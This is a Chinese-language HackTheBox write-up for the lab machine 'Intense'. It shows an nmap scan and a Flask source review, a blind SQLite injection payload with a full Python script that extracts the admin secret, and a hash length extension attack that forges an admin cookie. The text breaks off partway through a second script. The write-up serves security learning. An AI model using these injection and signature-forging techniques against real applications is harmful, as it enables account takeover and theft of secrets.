<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Intense - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;261  10.10.10.195  端口扫描 常规22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.195Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-08-26 13">
<meta property="og:type" content="article">
<meta property="og:title" content="Intense - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2020/09/01/Intense-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;261  10.10.10.195  端口扫描 常规22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.195Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-08-26 13">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082601.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082602.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082603.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082604.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082605.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082606.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082607.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082608.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082609.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082610.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082611.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082612.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082613.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082614.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082615.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082616.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082617.jpg">
<meta property="article:published_time" content="2020-09-01T06:00:58.000Z">
<meta property="article:modified_time" content="2020-11-16T00:39:31.708Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082601.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Intense - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Intense - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-09-01T06:00:58.000Z" itemprop="datePublished" class="page-time">
  2020-09-01
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-195"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.195</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#代码分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">代码分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#admin-py"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">admin.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#app-py"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">app.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lwt-py"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">lwt.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#utils-py"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">utils.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookie"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">cookie</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQL注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Boolean-Extract-Info"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Boolean Extract Info</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#admin-secret-sqli-py"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">admin-secret-sqli.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#哈希长度扩展攻击"><span class="post-toc-number">5.</span> <span class="post-toc-text">哈希长度扩展攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Hashpump"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">Hashpump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#admin"><span class="post-toc-number">6.</span> <span class="post-toc-text">admin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SNMP"><span class="post-toc-number">8.</span> <span class="post-toc-text">SNMP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#snmpset"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">snmpset</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#debian-snmp-shell-sh"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">debian-snmp-shell.sh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#note-server"><span class="post-toc-number">9.</span> <span class="post-toc-text">note_server</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ret2libc"><span class="post-toc-number">10.</span> <span class="post-toc-text">ret2libc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tunnel-sh"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">tunnel.sh</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pwn-server-py"><span class="post-toc-number">10.2.</span> <span class="post-toc-text">pwn_server.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">11.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Intense-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Intense - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-09-01 14:00:58" datetime="2020-09-01T06:00:58.000Z"  itemprop="datePublished">2020-09-01</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.eu/home/machines/profile/261" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/261</a></p>
</li>
<li><h2 id="10-10-10-195"><a href="#10-10-10-195" class="headerlink" title="10.10.10.195"></a>10.10.10.195</h2></li>
</ul>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p> 常规22和80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.195</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:01 CST</span><br><span class="line">Nmap scan report for 10.10.10.195</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)</span><br><span class="line">|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)</span><br><span class="line">|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)</span><br><span class="line">80/tcp  open   http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Intense - WebApp</span><br><span class="line">161/tcp closed snmp</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.48 seconds</span><br></pre></td></tr></table></figure>

<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>是一个开源系统，提供了guest账号密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082601.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>guest登录后可以提交feedback：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082602.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>提供了源码：</p>
<ul>
<li><a href="http://10.10.10.195/src.zip" target="_blank" rel="noopener">http://10.10.10.195/src.zip</a></li>
</ul>
<p>下载下来分析,很明显是Flask：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082603.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="admin-py"><a href="#admin-py" class="headerlink" title="admin.py"></a><strong>admin.py</strong></h2><p>判断权限，然后log view和list功能：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082604.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a><strong>app.py</strong></h2><p>主要就是登录登出以及submit功能，submit会判断长度以及过滤一些字符，然后insert，这里可以注入，需要bypass过滤，sqlite3数据库：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082605.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="lwt-py"><a href="#lwt-py" class="headerlink" title="lwt.py"></a><strong>lwt.py</strong></h2><p>主要是session，签名，验证之类的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082606.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="utils-py"><a href="#utils-py" class="headerlink" title="utils.py"></a><strong>utils.py</strong></h2><p>登录处理，权限判断，以及log之类的一些：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082607.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>根据代码可以知道cookie是session加sig，解析后是这样：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082608.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sqlite3注入，参考资料：</p>
<ul>
<li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL</a> Injection/SQLite Injection.md)</li>
</ul>
<h2 id="Boolean-Extract-Info"><a href="#Boolean-Extract-Info" class="headerlink" title="Boolean Extract Info"></a>Boolean Extract Info</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#39;AND (SELECT CASE WHEN ((SELECT substr(secret,&quot;+str(i+1)+&quot;,1) FROM users WHERE role&#x3D;1) &#x3D; &#39;&quot;+c+&quot;&#39;) THEN 1 ELSE MATCH(1,1) END))--&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082609.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;guest;secret&#x3D;84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec</span><br></pre></td></tr></table></figure>

<p>提示不能使用MATCH，这意思是无法match Admin用户secret的确切长度，我们需要一个循环脚本，guest的secret长度是64，我们需要循环直到64，尚未match完成就会得到这个响应，通过sql注入获取admin的secret：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Admin Secret: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105</span><br></pre></td></tr></table></figure>

<p>现在我们有admin的secret，但还需要解决sign问题</p>
<h2 id="admin-secret-sqli-py"><a href="#admin-secret-sqli-py" class="headerlink" title="admin-secret-sqli.py"></a>admin-secret-sqli.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  query_db("insert into messages values ('%s')" % message)  -&gt; get secret of admin</span></span><br><span class="line"><span class="comment"># admin role = 1 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://10.10.10.195"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase one, getting connection and login</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cooks</span><span class="params">()</span>:</span></span><br><span class="line">    sesh = requests.Session()</span><br><span class="line">    res = sesh.post(target + <span class="string">"/postlogin"</span>, data = &#123;<span class="string">"username"</span>: <span class="string">"guest"</span>, <span class="string">"password"</span>: <span class="string">"guest"</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> sesh.cookies[<span class="string">"auth"</span>]</span><br><span class="line"></span><br><span class="line">cookie = get_cooks()</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase two, submit a message</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(load)</span>:</span></span><br><span class="line">   </span><br><span class="line">   f = requests.post(target + <span class="string">"/submitmessage"</span>, data = &#123; <span class="string">"message"</span> : load &#125;, cookies = &#123; <span class="string">"auth"</span> : cookie &#125;)</span><br><span class="line">   <span class="keyword">return</span> f.text</span><br><span class="line"><span class="comment"># reference: https://www.sqlitetutorial.net/sqlite-case/ &amp; https://www.sqlite.org/lang_expr.html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"[+] Checking admin Secret"</span>)</span><br><span class="line">	time.sleep(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">		load = <span class="string">"' AND (select CASE WHEN ( (select length(secret) from users where role=1) = &#123;&#125; ) then match(1,1) END ))--"</span>.format(str(x))</span><br><span class="line">		c = <span class="string">"[+] Response: &#123;&#125;"</span>.format(submit(load))</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'unable'</span> <span class="keyword">in</span> c:</span><br><span class="line">			print(<span class="string">"[+] Attempted number: &#123;&#125;"</span>.format(str(x)))</span><br><span class="line">			print(<span class="string">"[+] Admin secret length: &#123;&#125;"</span>.format(str(x)))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Attempt number: 64</span></span><br><span class="line"><span class="comment">#[+] Response: unable to use function MATCH in the requested context</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"[+] Performing HEIST \n"</span>)</span><br><span class="line">	now = datetime.now()</span><br><span class="line">	current_time = now.strftime(<span class="string">"%H:%M:%S"</span>)</span><br><span class="line">	print(<span class="string">"started at: &#123;&#125;"</span>.format(str(current_time)))</span><br><span class="line">	time.sleep(<span class="number">5</span>)</span><br><span class="line">	secrets = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> lengths <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">67</span>):</span><br><span class="line">		<span class="keyword">for</span> chars <span class="keyword">in</span> range(<span class="number">47</span>, <span class="number">122</span>):</span><br><span class="line">			load = <span class="string">"' AND (select CASE WHEN ( (SELECT hex(substr(secret,&#123;a&#125;,1)) FROM users WHERE role=1) = hex('&#123;b&#125;') ) then match(1,1) END ))--"</span>.format(a=str(lengths),b=str(chr(chars)))</span><br><span class="line">			c = <span class="string">"[+] Response: &#123;&#125;"</span>.format(submit(load))</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'unable'</span> <span class="keyword">in</span> c:</span><br><span class="line">				print(<span class="string">"[+] Attempt no: &#123;&#125;"</span>.format(str(lengths)))</span><br><span class="line">				secrets += str(chr(chars))</span><br><span class="line">				print(secrets + <span class="string">'\n'</span>)</span><br><span class="line">				<span class="keyword">if</span> len(secrets) == <span class="number">64</span>:</span><br><span class="line">						print(<span class="string">"[+] Attempt number: &#123;&#125;"</span>.format(str(lengths)))	</span><br><span class="line">						print(<span class="string">"[+] Admin Secret: &#123;&#125;"</span>.format(secrets))</span><br><span class="line">						now = datetime.now()</span><br><span class="line">						current_time = now.strftime(<span class="string">"%H:%M:%S"</span>)</span><br><span class="line">						print(<span class="string">"end time: &#123;&#125;"</span>.format(str(endy)))</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					<span class="keyword">pass</span></span><br><span class="line">	print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">get_database()</span><br><span class="line"></span><br><span class="line"><span class="comment">#"' and (SELECT hex(substr(tbl_name,&#123;a&#125;,1)) FROM users WHERE role=1 and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#"' AND (select CASE WHEN ( (SELECT hex(substr(secret,&#123;a&#125;,1)) FROM users WHERE role=1) = hex('&#123;b&#125;')) ) then match(1,1) END ))--"</span></span><br></pre></td></tr></table></figure>

<h1 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h1><p>sign是直接这样的，可以使用哈希长度扩展攻击：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def sign(msg):</span><br><span class="line">    &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot;</span><br><span class="line">    return sha256(SECRET + msg).digest()</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<ul>
<li>Everything you need to know about hash length extension attacks » SkullSecurity<br><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></li>
</ul>
<h2 id="Hashpump"><a href="#Hashpump" class="headerlink" title="Hashpump"></a>Hashpump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install hashpumpy</span><br></pre></td></tr></table></figure>

<p>可以直接使用Hashpump，因为从代码里知道sig用的secret是SECRET = os.urandom(randrange(8, 15))，这样的不定长度，我们需要循环判断, 最终得到admin cookie：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] FOUND</span><br><span class="line">admin cookie: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwA7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7.0CuwS&#x2F;U8jtfL33f1MvSD8u5PBphquWkc4xJZYnN6HiA&#x3D;</span><br></pre></td></tr></table></figure>

<p>替换cookie，现在我们是admin：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082610.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>##Hashpump.py </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, 